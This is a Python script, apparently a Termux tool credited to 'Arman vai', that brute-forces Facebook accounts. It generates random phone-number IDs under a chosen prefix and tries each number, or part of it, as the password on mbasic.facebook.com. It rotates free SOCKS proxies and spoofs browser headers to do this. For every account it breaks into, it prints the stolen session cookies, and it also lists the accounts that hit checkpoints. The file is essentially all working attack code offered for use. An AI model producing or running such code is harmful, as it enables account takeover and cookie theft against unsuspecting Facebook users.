
# TOOLS MADE BY Arman vai
import os
import sys
import random
import string
import time
import re
from os import system as _ARMAN_
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system("pkg install espeak")
try:
    import requests
except:
    _ARMAN _("pip install requests")
    import requests
from requests.exceptions import ConnectionError

#-----------[+_+]
oks=[]
loop=0
user=[]
hEROn=[]
org=[]

session = requests.Session()


try:
    os.system('clear')
    try:os.system('rm -rf .proxy.txt')
    except:pass
    uno = requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
    open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
    sys.exit(f" [//] INTERNET CONNECTION ERROR")
XXL= open('.proxy.txt','r').read().splitlines()

def logo():
    print("""
    [1;90m———————————————————————————————————
    [1;97m[[47m[1;92m>)[0m[1;97m OWNER       : Arman vai
    [1;97m[[47m[1;92m>)[0m [1;97mFACEBOOK    : Arman vai
    [1;97m[[47m[1;92m>)[0m [1;97mNUMBER      : [1;92m01318805859
    [1;90m———————————————————————————————————""")

def Main():
    user=[]
    os.system('clear')
    logo()
    print(' [1;91m[>] [1;96mEXAMPLE : [1;92m017 [1;91m/ [1;92m018[1;91m / [1;92m 019[1;91m / [1;92m 016')
    print("[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    code = input(' [1;91m[>] [1;96mCRACKING CODE : [1;92m')
    os.system('clear')
    logo()
    print(' [1;91m[>] [1;96mEXAMPLE :   [1;92m10000[1;91m/[1;92m20000/[1;91m[1;92m30000[1;91m/[1;92m50000 ')
    print("[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    limit = int(input(' [1;91m[>][1;96m CRACK LIMIT : [1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        logo()
        tl = str(len(user))
        print("    [1;90m———————————————————————————————————")
        print(f'[1;96m            WAITING FOR OK IDS')
        print("    [1;90m———————————————————————————————————")
        for love in user:
            uid = code+love
            pwx = [love[2:],love]
            asha.submit(tool,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in MUHIB-OK.txt,-CP.txt')
    print('-------------------') 

def tool(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(XXL)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1.2000000476837158',
            'referer': 'https://www.google.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"RMX2195"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': max}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f"[1;32m[Arman vai]  {cid} - {ps}          ")
                print(f"[1;91m[>][1;92m=COOKIES : [1;96m{coki}")
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[1;30m[Arman vai-CP] {uid} | {ps}   ")
                #print(f"[1;92m=[/]=COOKIES : {coki}")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        org.append(uid)
        os.system(f"espeak {str(len(org))}")
        time.sleep(0.0001)
    except:
        pass
        
Main()

